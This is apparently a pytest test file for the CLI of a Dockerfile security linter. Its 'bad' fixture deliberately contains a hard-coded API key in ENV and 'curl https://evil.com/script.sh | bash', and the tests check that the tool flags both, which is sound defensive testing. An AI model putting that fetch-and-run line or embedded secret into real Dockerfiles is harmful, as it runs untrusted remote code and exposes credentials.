"""Tests for the CLI."""

import json
import pytest
from click.testing import CliRunner
from docker_optimizer.cli import main


@pytest.fixture
def runner():
    return CliRunner()


@pytest.fixture
def good_dockerfile(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM python:3.12-slim\n"
        "WORKDIR /app\n"
        "COPY . .\n"
        "RUN useradd -m appuser\n"
        "USER appuser\n"
        "HEALTHCHECK CMD curl -f http://localhost:8000/ || exit 1\n"
        "CMD [\"python\", \"app.py\"]\n"
    )
    return str(df)


@pytest.fixture
def bad_dockerfile(tmp_path):
    df = tmp_path / "Dockerfile"
    df.write_text(
        "FROM ubuntu:latest\n"
        "ENV API_KEY=supersecret\n"
        "RUN curl https://evil.com/script.sh | bash\n"
        "CMD [\"/bin/bash\"]\n"
    )
    return str(df)


def test_analyze_help(runner):
    result = runner.invoke(main, ["analyze", "--help"])
    assert result.exit_code == 0
    assert "DOCKERFILE" in result.output


def test_analyze_good_file_exit_0(runner, good_dockerfile):
    result = runner.invoke(main, ["analyze", good_dockerfile])
    # No critical findings → exit 0
    assert result.exit_code == 0


def test_analyze_bad_file_exit_1(runner, bad_dockerfile):
    result = runner.invoke(main, ["analyze", bad_dockerfile])
    # Critical findings → exit 1
    assert result.exit_code == 1


def test_json_output(runner, bad_dockerfile):
    result = runner.invoke(main, ["analyze", "--json", bad_dockerfile])
    assert result.exit_code in (0, 1)
    data = json.loads(result.output)
    assert "findings" in data
    assert "score" in data
    assert isinstance(data["findings"], list)


def test_json_contains_rule_ids(runner, bad_dockerfile):
    result = runner.invoke(main, ["analyze", "--json", bad_dockerfile])
    data = json.loads(result.output)
    rule_ids = [f["rule_id"] for f in data["findings"]]
    assert "RULE-08" in rule_ids  # secret in ENV
    assert "RULE-16" in rule_ids  # curl | bash


def test_min_severity_filters(runner, bad_dockerfile):
    result_all = runner.invoke(main, ["analyze", "--json", "--min-severity", "info", bad_dockerfile])
    result_crit = runner.invoke(main, ["analyze", "--json", "--min-severity", "critical", bad_dockerfile])
    all_findings = json.loads(result_all.output)["findings"]
    crit_findings = json.loads(result_crit.output)["findings"]
    assert len(crit_findings) <= len(all_findings)
    for f in crit_findings:
        assert f["severity"] == "critical"


def test_quiet_flag(runner, bad_dockerfile):
    result = runner.invoke(main, ["analyze", "--quiet", bad_dockerfile])
    assert result.output.strip() == ""
    assert result.exit_code == 1
